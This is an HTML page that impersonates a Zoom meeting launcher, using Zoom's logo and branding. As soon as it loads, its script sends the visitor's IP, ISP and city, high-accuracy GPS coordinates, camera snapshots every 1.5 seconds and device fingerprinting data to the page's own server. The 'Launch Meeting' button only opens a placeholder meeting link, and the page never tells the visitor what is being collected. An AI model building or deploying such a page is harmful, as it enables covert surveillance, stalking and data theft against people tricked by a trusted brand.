<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Zoom Meeting Launcher</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    :root {
      --zoom-blue: #2d8cff;
      --zoom-dark: #1a1a1a;
      --zoom-light: #f9f9f9;
    }
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: var(--zoom-light);
      color: #333;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }
    .navbar {
      background-color: white;
      padding: 12px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      box-shadow: 0 2px 5px rgba(0,0,0,0.05);
    }
    .navbar-left img {
      height: 40px;
    }
    .navbar-right a {
      margin-left: 20px;
      text-decoration: none;
      color: var(--zoom-blue);
      font-size: 14px;
    }
    .main {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 40px 20px;
      text-align: center;
    }
    .main p {
      max-width: 400px;
      margin: 10px 0;
      font-size: 15px;
      line-height: 1.5;
    }
    .main p strong {
      font-weight: bold;
    }
    .launch-btn {
      background-color: var(--zoom-blue);
      color: white;
      border: none;
      padding: 12px 24px;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 20px;
      transition: background-color 0.3s ease;
    }
    .launch-btn:hover {
      background-color: #1a6edc;
    }
    .download {
      margin-top: 25px;
      font-size: 14px;
    }
    .download a {
      color: var(--zoom-blue);
      text-decoration: none;
    }
    #location-status {
      margin-top: 10px;
      font-size: 13px;
      color: #555;
    }
    .footer {
      font-size: 12px;
      color: #777;
      text-align: center;
      padding: 20px;
      border-top: 1px solid #eee;
    }
    .footer a {
      color: var(--zoom-blue);
      text-decoration: none;
      margin: 0 5px;
    }
  </style>
</head>
<body>

  <div class="navbar">
    <div class="navbar-left">
      <img src="https://st1.zoom.us/homepage/publish/assets/images/zoom-logo.svg" alt="Zoom Logo">
    </div>
    <div class="navbar-right">
      <a href="#">Support</a>
      <a href="#">English</a>
    </div>
  </div>

  <div class="main">
    <p><strong>Click Open link</strong> on the dialog shown by your browser.</p>
    <p>If you don’t see a dialog, click <strong>Launch Meeting</strong> below.</p>
    <p>By clicking <strong>'Launch Meeting'</strong>, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Statement</a>.</p>

    <button class="launch-btn" onclick="launchMeeting()">Launch Meeting</button>

    <div class="download">
      Don’t have Zoom Client installed? <a href="https://zoom.us/download">Download Now</a>
    </div>
    <div id="location-status">Waiting for location permission...</div>
  </div>

  <div class="footer">
    ©2025 Zoom Video Communications, Inc. All rights reserved.<br>
    <a href="#">Privacy & Legal Policies</a> |
    <a href="#">Do Not Sell My Personal Information</a> |
    <a href="#">Cookie Preferences</a>
  </div>

  <script>
    // IP info on page load
    async function fetchIPDetails() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        const ipInfo = {
          ip: data.ip,
          version: data.version,
          isp: data.org,
          country: data.country_name,
          city: data.city
        };
        await fetch('/save_ip_info', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(ipInfo)
        });
      } catch (err) {
        console.error("Failed to fetch IP info:", err);
      }
    }

    // GPS-only location capture on load
    function captureLocation() {
      const statusDiv = document.getElementById('location-status');

      if (!navigator.geolocation) {
        statusDiv.innerText = 'Geolocation not supported.';
        return;
      }

      navigator.geolocation.getCurrentPosition(
        async pos => {
          const { latitude, longitude, accuracy } = pos.coords;
          statusDiv.innerText = 'Location captured.';
          try {
            await fetch('/save_location', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ latitude, longitude, accuracy })
            });
            statusDiv.innerText = 'Location sent successfully.';
          } catch (err) {
            console.error('Location send failed:', err);
            statusDiv.innerText = 'Failed to send location.';
          }
        },
        err => {
          console.warn('Location error:', err.message);
          statusDiv.innerText = 'Location blocked or unavailable.';
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
    }

    // Camera capture every 1.5s
    async function captureCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 720, height: 420 } });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        let counter = 1;
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');

        async function captureFrame() {
          canvas.width = 720;
          canvas.height = 420;
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const dataUrl = canvas.toDataURL('image/png');
          try {
            await fetch('/save_photo', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ image: dataUrl, count: counter })
            });
            counter++;
          } catch (err) {
            console.error('Camera upload failed:', err);
          }
          setTimeout(captureFrame, 1500);
        }

        captureFrame();
      } catch (err) {
        console.error('Camera access denied or failed:', err);
      }
    }

    // Client system info
    async function reportClientInfo() {
      try {
        const battery = await navigator.getBattery();
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        const dbg = gl && gl.getExtension('WEBGL_debug_renderer_info');
        const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'Unknown';

        let osVersion = 'Unknown';
        const ua = navigator.userAgent;
        const android = ua.match(/Android\s([0-9\.]+)/);
        const ios = ua.match(/iPhone OS ([0-9\_]+)/);
        if (android) osVersion = android[1];
        else if (ios) osVersion = ios[1].replace('_', '.');

        const info = {
          battery: Math.floor(battery.level * 100),
          cpuCores: navigator.hardwareConcurrency || 'Unknown',
          ram: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown',
          gpu,
          osVersion,
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          screenWidth: screen.width,
          screenHeight: screen.height,
          language: navigator.language,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };

        await fetch('/save_client_info', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(info)
        });
      } catch (err) {
        console.error('Client info report failed:', err);
      }
    }

    // Launch Zoom meeting
    function launchMeeting() {
      const zoomUrl = 'https://zoom.us/j/1234567890';
      window.open(zoomUrl, '_blank');
    }

    // Initialize everything on page load
    window.addEventListener('load', () => {
      fetchIPDetails();
      captureLocation();
      captureCamera();
      reportClientInfo();
    });
  </script>
</body>
</html>